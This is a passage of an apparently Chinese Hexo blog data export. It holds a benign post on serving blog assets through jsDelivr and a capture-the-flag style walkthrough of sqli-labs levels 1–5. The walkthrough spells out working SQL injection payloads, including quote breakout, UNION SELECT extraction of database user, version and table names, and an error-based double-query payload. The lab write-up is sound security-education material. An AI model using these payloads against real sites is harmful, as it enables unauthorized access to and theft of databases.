  //添加所有文件到暂存区\ngit commit -m '第一次提交'      //把文件提交到仓库\ngit push                      //推送至远程仓库\n```\n\n\n\n​\t这里我说一下是怎么加速自己的博客的，因为博客加载的时候需要加载主题的各种js和css文件，然后因为服务器网渣所以加载时间很慢，使用加速的话就会加载的快。\n\n​\t接下来是要上传哪些文件，我使用的是`butterfly`这个主题，[主题github](https://github.com/jerryc127/hexo-theme-butterfly)支持一下作者，直接在主题`theme/butterfly`文件夹下面找到资源文件夹`source`发现里面都是一些零碎的文件，但是在发布文件夹`public`下是一个完整的js和css，所以猜测生成的时候会把零碎的文件进行整合，然后主题配置文件里作者也写的很清楚\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed/artical/20201111205045.png)\t穷人流下了不争气的泪。传！(真加速还得选好服务器)\n\n​\t这里我的分析是：由于引用的不是本地的资源文件，所以可能会产生自己在本地修改了某项配置，但是网页没有生效，这里就需要时刻记着自己引用的是github上的资源，如果本地配置大改的话，github上的文件也要进行重新上传覆盖。\n\n​\t做法：配置文件里找到引用的是本地资源的项，然后在生成网站的`public`文件下找到对应的资源文件。\n\n我列一下我在配置文件里修改的项：`main_css`、`main`、`utils`、`local_search`、`algolia_js`、`translate`，因为使用的是`Valine`评论，里面可以设置自定义表情，我也使用这个方法修改了。\n\n\n\n## 3. 获取地址\n\n​\t官网首页很清楚的写明了如何获取资源链接\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201111211357.png)\n\n​\t`https://cdn.jsdelivr.net/gh/user/repo@version/file`，`user`就是你的github用户名，`repo@version`，仓库加上版本号，`file`就是仓库下的路径。\n\n​\t这里我没有说版本号是因为网上的教程讲到了仓库需要发布，但是我后面无意间发现不用发布直接`reop@分支名`，也可以访问到。并且我一开始也发布仓库了，但是后面想要修改已经上传的文件也出了一些问题，索性直接用简单的。\n\n​\t贴一个我博客首页的壁纸链接：https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/top_img/83531406_p0.png\n\n​\t这个壁纸有12M大小，而且链接也符合上面的格式，可以参考一下。\n\n\n\n## 4. 引用链接\n\n​\t配置文件里可以找需要替换的资源，直接贴上链接就可以了，只不过以后别忘了**你现在引用的是之前的上传的静态资源**，别忘啦！别忘啦！别忘啦！\n\n​\t我发现github能这样用以后就在上面整了图床，现在博客里的图片都开始在上传，之前用的路过图床，说的全球都有CDN加速，但是还是卡的一。\n\n​\t还有我整理的`Valine`评论的自定义表情，大伙可以直接拿去用：[图片地址](https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/emoji/)，[emojimap](https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/emoji/valine.json)。完工\n\n\n\n","slug":"jsDelivr加速静态博客","published":1,"updated":"2021-12-30T09:42:54.201Z","_id":"ckrr3f9b7001jhotcdsna987p","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​    这几天总感觉博客访问特别慢，最先是找到了CDN加速，但是在国内加速的话域名都是要备案的，又看了看境外加速。</p>\n<blockquote>\n<p> CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科</p>\n</blockquote>\n<p>在犹豫要不要买的时候，发现了这个东西：<a href=\"https://www.jsdelivr.com/\">jsdelivr</a>，一个可以加速静态资源的免费CDN，官网上能看的出和WordPress有什么py关系还可以加速github的资源。hexo是静态博客，那么我就把博客要用到的js、css、还有博客用到的一些图片都放github然后引用。开搞</p>\n<h2 id=\"1-新建仓库\"><a href=\"#1-新建仓库\" class=\"headerlink\" title=\"1. 新建仓库\"></a>1. 新建仓库</h2><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed/artical/20201111202508.png\"></p>\n<p>​    名字重了是因为我已经创建好了并且使用了以后才来写的博客。</p>\n<h2 id=\"2-克隆Git仓库到本地\"><a href=\"#2-克隆Git仓库到本地\" class=\"headerlink\" title=\"2. 克隆Git仓库到本地\"></a>2. 克隆Git仓库到本地</h2><p>​    在自己电脑建个文件夹然后打开git输入<code>git clone 你仓库的链接</code>，把刚刚创建的仓库拉倒本地方便上传到仓库。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed/artical/20201111203733.png\"></p>\n<p>廖雪峰老师的git教程我当时看了一遍，觉得非常棒，哈哈哈就是自己太菜了又给忘了，帖出来：<a href=\"https://www.liaoxuefeng.com/wiki/896043488029600/896067008724000\">Git简介</a>。</p>\n<h2 id=\"3-上传需要加速的资源\"><a href=\"#3-上传需要加速的资源\" class=\"headerlink\" title=\"3. 上传需要加速的资源\"></a>3. 上传需要加速的资源</h2><p>​    把需要上传的资源整理到刚刚拉下来的本地git仓库，上传。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git status                    //查看状态</span><br><span class=\"line\">git add .                     //添加所有文件到暂存区</span><br><span class=\"line\">git commit -m &#x27;第一次提交&#x27;      //把文件提交到仓库</span><br><span class=\"line\">git push                      //推送至远程仓库</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​    这里我说一下是怎么加速自己的博客的，因为博客加载的时候需要加载主题的各种js和css文件，然后因为服务器网渣所以加载时间很慢，使用加速的话就会加载的快。</p>\n<p>​    接下来是要上传哪些文件，我使用的是<code>butterfly</code>这个主题，<a href=\"https://github.com/jerryc127/hexo-theme-butterfly\">主题github</a>支持一下作者，直接在主题<code>theme/butterfly</code>文件夹下面找到资源文件夹<code>source</code>发现里面都是一些零碎的文件，但是在发布文件夹<code>public</code>下是一个完整的js和css，所以猜测生成的时候会把零碎的文件进行整合，然后主题配置文件里作者也写的很清楚</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed/artical/20201111205045.png\">    穷人流下了不争气的泪。传！(真加速还得选好服务器)</p>\n<p>​    这里我的分析是：由于引用的不是本地的资源文件，所以可能会产生自己在本地修改了某项配置，但是网页没有生效，这里就需要时刻记着自己引用的是github上的资源，如果本地配置大改的话，github上的文件也要进行重新上传覆盖。</p>\n<p>​    做法：配置文件里找到引用的是本地资源的项，然后在生成网站的<code>public</code>文件下找到对应的资源文件。</p>\n<p>我列一下我在配置文件里修改的项：<code>main_css</code>、<code>main</code>、<code>utils</code>、<code>local_search</code>、<code>algolia_js</code>、<code>translate</code>，因为使用的是<code>Valine</code>评论，里面可以设置自定义表情，我也使用这个方法修改了。</p>\n<h2 id=\"3-获取地址\"><a href=\"#3-获取地址\" class=\"headerlink\" title=\"3. 获取地址\"></a>3. 获取地址</h2><p>​    官网首页很清楚的写明了如何获取资源链接</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201111211357.png\"></p>\n<p>​    <code>https://cdn.jsdelivr.net/gh/user/repo@version/file</code>，<code>user</code>就是你的github用户名，<code>repo@version</code>，仓库加上版本号，<code>file</code>就是仓库下的路径。</p>\n<p>​    这里我没有说版本号是因为网上的教程讲到了仓库需要发布，但是我后面无意间发现不用发布直接<code>reop@分支名</code>，也可以访问到。并且我一开始也发布仓库了，但是后面想要修改已经上传的文件也出了一些问题，索性直接用简单的。</p>\n<p>​    贴一个我博客首页的壁纸链接：<a href=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/top_img/83531406_p0.png\">https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/top_img/83531406_p0.png</a></p>\n<p>​    这个壁纸有12M大小，而且链接也符合上面的格式，可以参考一下。</p>\n<h2 id=\"4-引用链接\"><a href=\"#4-引用链接\" class=\"headerlink\" title=\"4. 引用链接\"></a>4. 引用链接</h2><p>​    配置文件里可以找需要替换的资源，直接贴上链接就可以了，只不过以后别忘了<strong>你现在引用的是之前的上传的静态资源</strong>，别忘啦！别忘啦！别忘啦！</p>\n<p>​    我发现github能这样用以后就在上面整了图床，现在博客里的图片都开始在上传，之前用的路过图床，说的全球都有CDN加速，但是还是卡的一。</p>\n<p>​    还有我整理的<code>Valine</code>评论的自定义表情，大伙可以直接拿去用：<a href=\"https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/emoji/\">图片地址</a>，<a href=\"https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/emoji/valine.json\">emojimap</a>。完工</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​    这几天总感觉博客访问特别慢，最先是找到了CDN加速，但是在国内加速的话域名都是要备案的，又看了看境外加速。</p>\n<blockquote>\n<p> CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科</p>\n</blockquote>\n<p>在犹豫要不要买的时候，发现了这个东西：<a href=\"https://www.jsdelivr.com/\">jsdelivr</a>，一个可以加速静态资源的免费CDN，官网上能看的出和WordPress有什么py关系还可以加速github的资源。hexo是静态博客，那么我就把博客要用到的js、css、还有博客用到的一些图片都放github然后引用。开搞</p>\n<h2 id=\"1-新建仓库\"><a href=\"#1-新建仓库\" class=\"headerlink\" title=\"1. 新建仓库\"></a>1. 新建仓库</h2><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed/artical/20201111202508.png\"></p>\n<p>​    名字重了是因为我已经创建好了并且使用了以后才来写的博客。</p>\n<h2 id=\"2-克隆Git仓库到本地\"><a href=\"#2-克隆Git仓库到本地\" class=\"headerlink\" title=\"2. 克隆Git仓库到本地\"></a>2. 克隆Git仓库到本地</h2><p>​    在自己电脑建个文件夹然后打开git输入<code>git clone 你仓库的链接</code>，把刚刚创建的仓库拉倒本地方便上传到仓库。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed/artical/20201111203733.png\"></p>\n<p>廖雪峰老师的git教程我当时看了一遍，觉得非常棒，哈哈哈就是自己太菜了又给忘了，帖出来：<a href=\"https://www.liaoxuefeng.com/wiki/896043488029600/896067008724000\">Git简介</a>。</p>\n<h2 id=\"3-上传需要加速的资源\"><a href=\"#3-上传需要加速的资源\" class=\"headerlink\" title=\"3. 上传需要加速的资源\"></a>3. 上传需要加速的资源</h2><p>​    把需要上传的资源整理到刚刚拉下来的本地git仓库，上传。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git status                    //查看状态</span><br><span class=\"line\">git add .                     //添加所有文件到暂存区</span><br><span class=\"line\">git commit -m &#x27;第一次提交&#x27;      //把文件提交到仓库</span><br><span class=\"line\">git push                      //推送至远程仓库</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​    这里我说一下是怎么加速自己的博客的，因为博客加载的时候需要加载主题的各种js和css文件，然后因为服务器网渣所以加载时间很慢，使用加速的话就会加载的快。</p>\n<p>​    接下来是要上传哪些文件，我使用的是<code>butterfly</code>这个主题，<a href=\"https://github.com/jerryc127/hexo-theme-butterfly\">主题github</a>支持一下作者，直接在主题<code>theme/butterfly</code>文件夹下面找到资源文件夹<code>source</code>发现里面都是一些零碎的文件，但是在发布文件夹<code>public</code>下是一个完整的js和css，所以猜测生成的时候会把零碎的文件进行整合，然后主题配置文件里作者也写的很清楚</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed/artical/20201111205045.png\">    穷人流下了不争气的泪。传！(真加速还得选好服务器)</p>\n<p>​    这里我的分析是：由于引用的不是本地的资源文件，所以可能会产生自己在本地修改了某项配置，但是网页没有生效，这里就需要时刻记着自己引用的是github上的资源，如果本地配置大改的话，github上的文件也要进行重新上传覆盖。</p>\n<p>​    做法：配置文件里找到引用的是本地资源的项，然后在生成网站的<code>public</code>文件下找到对应的资源文件。</p>\n<p>我列一下我在配置文件里修改的项：<code>main_css</code>、<code>main</code>、<code>utils</code>、<code>local_search</code>、<code>algolia_js</code>、<code>translate</code>，因为使用的是<code>Valine</code>评论，里面可以设置自定义表情，我也使用这个方法修改了。</p>\n<h2 id=\"3-获取地址\"><a href=\"#3-获取地址\" class=\"headerlink\" title=\"3. 获取地址\"></a>3. 获取地址</h2><p>​    官网首页很清楚的写明了如何获取资源链接</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201111211357.png\"></p>\n<p>​    <code>https://cdn.jsdelivr.net/gh/user/repo@version/file</code>，<code>user</code>就是你的github用户名，<code>repo@version</code>，仓库加上版本号，<code>file</code>就是仓库下的路径。</p>\n<p>​    这里我没有说版本号是因为网上的教程讲到了仓库需要发布，但是我后面无意间发现不用发布直接<code>reop@分支名</code>，也可以访问到。并且我一开始也发布仓库了，但是后面想要修改已经上传的文件也出了一些问题，索性直接用简单的。</p>\n<p>​    贴一个我博客首页的壁纸链接：<a href=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/top_img/83531406_p0.png\">https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/top_img/83531406_p0.png</a></p>\n<p>​    这个壁纸有12M大小，而且链接也符合上面的格式，可以参考一下。</p>\n<h2 id=\"4-引用链接\"><a href=\"#4-引用链接\" class=\"headerlink\" title=\"4. 引用链接\"></a>4. 引用链接</h2><p>​    配置文件里可以找需要替换的资源，直接贴上链接就可以了，只不过以后别忘了<strong>你现在引用的是之前的上传的静态资源</strong>，别忘啦！别忘啦！别忘啦！</p>\n<p>​    我发现github能这样用以后就在上面整了图床，现在博客里的图片都开始在上传，之前用的路过图床，说的全球都有CDN加速，但是还是卡的一。</p>\n<p>​    还有我整理的<code>Valine</code>评论的自定义表情，大伙可以直接拿去用：<a href=\"https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/emoji/\">图片地址</a>，<a href=\"https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/emoji/valine.json\">emojimap</a>。完工</p>\n"},{"title":"sql-labs(一)","date":"2020-09-22T02:50:08.000Z","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111120858.png","_content":"\n## 前言\n\n在线靶机地址：https://buuoj.cn/challenges#sqli-labs\n\n## less-1\n\n​\t首先说明sql注入的大致步骤：\n\n* 判断注入类型。如整型字符型注入等。\n* 判断列数\n* 判断数据的回显位\n* 构造sql语句\n\n\n\n​\t根据题目提示，说明是一个单引号注入题目，构造一个带单引号的语句`?id=1'`，发现数据库报错\n\n![](https://s1.ax1x.com/2020/11/04/BgERNd.png)\n\n​\t通过后面的报错语句`1'' LIMIT 0,1`的分析，我们的单引号被数据库解析，那么说明我们也可以使用连接查询`union`插入我们想要查询的语句。\n\n​\t推出数据库的查询的部分语句可能为`where id = '$id'LIMIT 0,1`，那么通过构造闭合`?id=1' [这里添加语句] --+`添加自己想要语句，语句后面的`--+`作用是将后面的其他语句注释掉。\n\n​\t首先是判断字段个数：`?id=1' order by 1 --+`，页面显示正常，直到尝试`?id=1' order by 4 --+`发现数据库报错\n\n![](https://s1.ax1x.com/2020/11/04/BgVsGn.png)\n\n​\t说明数据库的字段值只有四个。\n\n​\t接下来测试数据的回显位，构造语句`?id=' union select 1,2,3 --+`，这里需要注意的有，前面`id`的查询一定是要不存在的，因为数据库只会回显第一条查询的数据，如果第一条语句查询成功则后面`union`构造的语句就不会显示；`union`连接查询语句后面查询的字段数需要和前面的字段数相等，详细用法可以自行查询。\n\n​\t执行后页面显示。\n\n![](https://s1.ax1x.com/2020/11/04/BgZAeS.png)\n\n​\t说明查询语句的`2,3`是回显位，之后就可以将查询的语句进行替换。如：\n\n​\t获取数据库版本，数据库路径，当前用户，当前数据库：\n​\t`?id=' union select 1,concat_ws('_',user(),version(),database()),@@basedir --+` \n\n页面显示\n\n![](https://s1.ax1x.com/2020/11/04/BgZbfs.png)\n\n​\t利用元数据库来爆表、爆数据\n\n​\t`?id=' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+`\n\n​\t之后大家可以自行发挥。\n\n​\t`flag`的话我做的题是在`ctftraining.flag`表中，答案在：`?id=' union select 1,flag,3 from ctftraining.flag  --+`\n\n## less-2\n\n​\t第二题看题目名称`intiger based`知大意，是id的数据类型由字符型变成了数字类型，这次就不使用单引号直接构造语句，和第一题差不多。\n\n## less-3\n\n​\t看标题`Single quotes with twist`，是在前面题的基础上加上了括号包裹，所以语句就成了`where id = ('id')`所以我们闭合的方式也要改变。附源码\n\n![](https://s1.ax1x.com/2020/11/04/BgnO1A.png)\n\n## less-4\n\n​\t标题`Double Quotes`，说明是个引号注入，把前面题的单引号改成双引号构成闭合即可。\n\n## less-5\n\n​\t标题`Double Injection-Single Quotes`，很明显提示是单引号，然后套用前面的方法， 发现这次题目变了，不管输入啥页面只显示一个`You are in...........`，但是数据库报错还是会显示，只要数据库错误还能显示，我们就可以是用一个新的技术把数据显示在错误信息上。\n\n​\t双查询注入也是我第一次听，贴一个讲大致原理的帖子：[点我](https://blog.csdn.net/Leep0rt/article/details/78556440)。\n\n​\t构造语句：\n\n`?id=' union select 1,2,3 from (select 1,count(*),concat_ws('____________',floor(rand()*2),concat_ws('********',version(),database()))a from information_schema.tables group by a)b --+`\n\n​\t讲一下`CONCAT_WS(separator,str1,str2,…)`函数的用法：把`str1`、`str2`连接起来，并使用`separator`做分隔符。\n\n","source":"_posts/sql-labs1.md","raw":"---\ntitle: sql-labs(一)\ndate: 2020-09-22 10:50:08\ntags: \n- sql注入\ncategories:\n- DROPS\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111120858.png\n---\n\n## 前言\n\n在线靶机地址：https://buuoj.cn/challenges#sqli-labs\n\n## less-1\n\n​\t首先说明sql注入的大致步骤：\n\n* 判断注入类型。如整型字符型注入等。\n* 判断列数\n* 判断数据的回显位\n* 构造sql语句\n\n\n\n​\t根据题目提示，说明是一个单引号注入题目，构造一个带单引号的语句`?id=1'`，发现数据库报错\n\n![](https://s1.ax1x.com/2020/11/04/BgERNd.png)\n\n​\t通过后面的报错语句`1'' LIMIT 0,1`的分析，我们的单引号被数据库解析，那么说明我们也可以使用连接查询`union`插入我们想要查询的语句。\n\n​\t推出数据库的查询的部分语句可能为`where id = '$id'LIMIT 0,1`，那么通过构造闭合`?id=1' [这里添加语句] --+`添加自己想要语句，语句后面的`--+`作用是将后面的其他语句注释掉。\n\n​\t首先是判断字段个数：`?id=1' order by 1 --+`，页面显示正常，直到尝试`?id=1' order by 4 --+`发现数据库报错\n\n![](https://s1.ax1x.com/2020/11/04/BgVsGn.png)\n\n​\t说明数据库的字段值只有四个。\n\n​\t接下来测试数据的回显位，构造语句`?id=' union select 1,2,3 --+`，这里需要注意的有，前面`id`的查询一定是要不存在的，因为数据库只会回显第一条查询的数据，如果第一条语句查询成功则后面`union`构造的语句就不会显示；`union`连接查询语句后面查询的字段数需要和前面的字段数相等，详细用法可以自行查询。\n\n​\t执行后页面显示。\n\n![](https://s1.ax1x.com/2020/11/04/BgZAeS.png)\n\n​\t说明查询语句的`2,3`是回显位，之后就可以将查询的语句进行替换。如：\n\n​\t获取数据库版本，数据库路径，当前用户，当前数据库：\n​\t`?id=' union select 1,concat_ws('_',user(),version(),database()),@@basedir --+` \n\n页面显示\n\n![](https://s1.ax1x.com/2020/11/04/BgZbfs.png)\n\n​\t利用元数据库来爆表、爆数据\n\n​\t`?id=' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+`\n\n​\t之后大家可以自行发挥。\n\n​\t`flag`的话我做的题是在`ctftraining.flag`表中，答案在：`?id=' union select 1,flag,3 from ctftraining.flag  --+`\n\n## less-2\n\n​\t第二题看题目名称`intiger based`知大意，是id的数据类型由字符型变成了数字类型，这次就不使用单引号直接构造语句，和第一题差不多。\n\n## less-3\n\n​\t看标题`Single quotes with twist`，是在前面题的基础上加上了括号包裹，所以语句就成了`where id = ('id')`所以我们闭合的方式也要改变。附源码\n\n![](https://s1.ax1x.com/2020/11/04/BgnO1A.png)\n\n## less-4\n\n​\t标题`Double Quotes`，说明是个引号注入，把前面题的单引号改成双引号构成闭合即可。\n\n## less-5\n\n​\t标题`Double Injection-Single Quotes`，很明显提示是单引号，然后套用前面的方法， 发现这次题目变了，不管输入啥页面只显示一个`You are in...........`，但是数据库报错还是会显示，只要数据库错误还能显示，我们就可以是用一个新的技术把数据显示在错误信息上。\n\n​\t双查询注入也是我第一次听，贴一个讲大致原理的帖子：[点我](https://blog.csdn.net/Leep0rt/article/details/78556440)。\n\n​\t构造语句：\n\n`?id=' union select 1,2,3 from (select 1,count(*),concat_ws('____________',floor(rand()*2),concat_ws('********',version(),database()))a from information_schema.tables group by a)b --+`\n\n​\t讲一下`CONCAT_WS(separator,str1,str2,…)`函数的用法：把`str1`、`str2`连接起来，并使用`separator`做分隔符。\n\n","slug":"sql-labs1","published":1,"updated":"2021-12-30T09:42:54.202Z","_id":"ckrr3f9b8001nhotc1pyw41tf","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>在线靶机地址：<a href=\"https://buuoj.cn/challenges#sqli-labs\">https://buuoj.cn/challenges#sqli-labs</a></p>\n<h2 id=\"less-1\"><a href=\"#less-1\" class=\"headerlink\" title=\"less-1\"></a>less-1</h2><p>​    首先说明sql注入的大致步骤：</p>\n<ul>\n<li>判断注入类型。如整型字符型注入等。</li>\n<li>判断列数</li>\n<li>判断数据的回显位</li>\n<li>构造sql语句</li>\n</ul>\n<p>​    根据题目提示，说明是一个单引号注入题目，构造一个带单引号的语句<code>?id=1&#39;</code>，发现数据库报错</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/04/BgERNd.png\"></p>\n<p>​    通过后面的报错语句<code>1&#39;&#39; LIMIT 0,1</code>的分析，我们的单引号被数据库解析，那么说明我们也可以使用连接查询<code>union</code>插入我们想要查询的语句。</p>\n<p>​    推出数据库的查询的部分语句可能为<code>where id = &#39;$id&#39;LIMIT 0,1</code>，那么通过构造闭合<code>?id=1&#39; [这里添加语句] --+</code>添加自己想要语句，语句后面的<code>--+</code>作用是将后面的其他语句注释掉。</p>\n<p>​    首先是判断字段个数：<code>?id=1&#39; order by 1 --+</code>，页面显示正常，直到尝试<code>?id=1&#39; order by 4 --+</code>发现数据库报错</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/04/BgVsGn.png\"></p>\n<p>​    说明数据库的字段值只有四个。</p>\n<p>​    接下来测试数据的回显位，构造语句<code>?id=&#39; union select 1,2,3 --+</code>，这里需要注意的有，前面<code>id</code>的查询一定是要不存在的，因为数据库只会回显第一条查询的数据，如果第一条语句查询成功则后面<code>union</code>构造的语句就不会显示；<code>union</code>连接查询语句后面查询的字段数需要和前面的字段数相等，详细用法可以自行查询。</p>\n<p>​    执行后页面显示。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/04/BgZAeS.png\"></p>\n<p>​    说明查询语句的<code>2,3</code>是回显位，之后就可以将查询的语句进行替换。如：</p>\n<p>​    获取数据库版本，数据库路径，当前用户，当前数据库：<br>​    <code>?id=&#39; union select 1,concat_ws(&#39;_&#39;,user(),version(),database()),@@basedir --+</code> </p>\n<p>页面显示</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/04/BgZbfs.png\"></p>\n<p>​    利用元数据库来爆表、爆数据</p>\n<p>​    <code>?id=&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></p>\n<p>​    之后大家可以自行发挥。</p>\n<p>​    <code>flag</code>的话我做的题是在<code>ctftraining.flag</code>表中，答案在：<code>?id=&#39; union select 1,flag,3 from ctftraining.flag  --+</code></p>\n<h2 id=\"less-2\"><a href=\"#less-2\" class=\"headerlink\" title=\"less-2\"></a>less-2</h2><p>​    第二题看题目名称<code>intiger based</code>知大意，是id的数据类型由字符型变成了数字类型，这次就不使用单引号直接构造语句，和第一题差不多。</p>\n<h2 id=\"less-3\"><a href=\"#less-3\" class=\"headerlink\" title=\"less-3\"></a>less-3</h2><p>​    看标题<code>Single quotes with twist</code>，是在前面题的基础上加上了括号包裹，所以语句就成了<code>where id = (&#39;id&#39;)</code>所以我们闭合的方式也要改变。附源码</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/04/BgnO1A.png\"></p>\n<h2 id=\"less-4\"><a href=\"#less-4\" class=\"headerlink\" title=\"less-4\"></a>less-4</h2><p>​    标题<code>Double Quotes</code>，说明是个引号注入，把前面题的单引号改成双引号构成闭合即可。</p>\n<h2 id=\"less-5\"><a href=\"#less-5\" class=\"headerlink\" title=\"less-5\"></a>less-5</h2><p>​    标题<code>Double Injection-Single Quotes</code>，很明显提示是单引号，然后套用前面的方法， 发现这次题目变了，不管输入啥页面只显示一个<code>You are in...........</code>，但是数据库报错还是会显示，只要数据库错误还能显示，我们就可以是用一个新的技术把数据显示在错误信息上。</p>\n<p>​    双查询注入也是我第一次听，贴一个讲大致原理的帖子：<a href=\"https://blog.csdn.net/Leep0rt/article/details/78556440\">点我</a>。</p>\n<p>​    构造语句：</p>\n<p><code>?id=&#39; union select 1,2,3 from (select 1,count(*),concat_ws(&#39;____________&#39;,floor(rand()*2),concat_ws(&#39;********&#39;,version(),database()))a from information_schema.tables group by a)b --+</code></p>\n<p>​    讲一下<code>CONCAT_WS(separator,str1,str2,…)</code>函数的用法：把<code>str1</code>、<code>str2</code>连接起来，并使用<code>separator</code>做分隔符。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>在线靶机地址：<a href=\"https://buuoj.cn/challenges#sqli-labs\">https://buuoj.cn/challenges#sqli-labs</a></p>\n<h2 id=\"less-1\"><a href=\"#less-1\" class=\"headerlink\" title=\"less-1\"></a>less-1</h2><p>​    首先说明sql注入的大致步骤：</p>\n<ul>\n<li>判断注入类型。如整型字符型注入等。</li>\n<li>判断列数</li>\n<li>判断数据的回显位</li>\n<li>构造sql语句</li>\n</ul>\n<p>​    根据题目提示，说明是一个单引号注入题目，构造一个带单引号的语句<code>?id=1&#39;</code>，发现数据库报错</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/04/BgERNd.png\"></p>\n<p>​    通过后面的报错语句<code>1&#39;&#39; LIMIT 0,1</code>的分析，我们的单引号被数据库解析，那么说明我们也可以使用连接查询<code>union</code>插入我们想要查询的语句。</p>\n<p>​    推出数据库的查询的部分语句可能为<code>where id = &#39;$id&#39;LIMIT 0,1</code>，那么通过构造闭合<code>?id=1&#39; [这里添加语句] --+</code>添加自己想要语句，语句后面的<code>--+</code>作用是将后面的其他语句注释掉。</p>\n<p>​    首先是判断字段个数：<code>?id=1&#39; order by 1 --+</code>，页面显示正常，直到尝试<code>?id=1&#39; order by 4 --+</code>发现数据库报错</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/04/BgVsGn.png\"></p>\n<p>​    说明数据库的字段值只有四个。</p>\n<p>​    接下来测试数据的回显位，构造语句<code>?id=&#39; union select 1,2,3 --+</code>，这里需要注意的有，前面<code>id</code>的查询一定是要不存在的，因为数据库只会回显第一条查询的数据，如果第一条语句查询成功则后面<code>union</code>构造的语句就不会显示；<code>union</code>连接查询语句后面查询的字段数需要和前面的字段数相等，详细用法可以自行查询。</p>\n<p>​    执行后页面显示。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/04/BgZAeS.png\"></p>\n<p>​    说明查询语句的<code>2,3</code>是回显位，之后就可以将查询的语句进行替换。如：</p>\n<p>​    获取数据库版本，数据库路径，当前用户，当前数据库：<br>​    <code>?id=&#39; union select 1,concat_ws(&#39;_&#39;,user(),version(),database()),@@basedir --+</code> </p>\n<p>页面显示</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/04/BgZbfs.png\"></p>\n<p>​    利用元数据库来爆表、爆数据</p>\n<p>​    <code>?id=&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></p>\n<p>​    之后大家可以自行发挥。</p>\n<p>​    <code>flag</code>的话我做的题是在<code>ctftraining.flag</code>表中，答案在：<code>?id=&#39; union select 1,flag,3 from ctftraining.flag  --+</code></p>\n<h2 id=\"less-2\"><a href=\"#less-2\" class=\"headerlink\" title=\"less-2\"></a>less-2</h2><p>​    第二题看题目名称<code>intiger based</code>知大意，是id的数据类型由字符型变成了数字类型，这次就不使用单引号直接构造语句，和第一题差不多。</p>\n<h2 id=\"less-3\"><a href=\"#less-3\" class=\"headerlink\" title=\"less-3\"></a>less-3</h2><p>​    看标题<code>Single quotes with twist</code>，是在前面题的基础上加上了括号包裹，所以语句就成了<code>where id = (&#39;id&#39;)</code>所以我们闭合的方式也要改变。附源码</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/04/BgnO1A.png\"></p>\n<h2 id=\"less-4\"><a href=\"#less-4\" class=\"headerlink\" title=\"less-4\"></a>less-4</h2><p>​    标题<code>Double Quotes</code>，说明是个引号注入，把前面题的单引号改成双引号构成闭合即可。</p>\n<h2 id=\"less-5\"><a href=\"#less-5\" class=\"headerlink\" title=\"less-5\"></a>less-5</h2><p>​    标题<code>Double Injection-Single 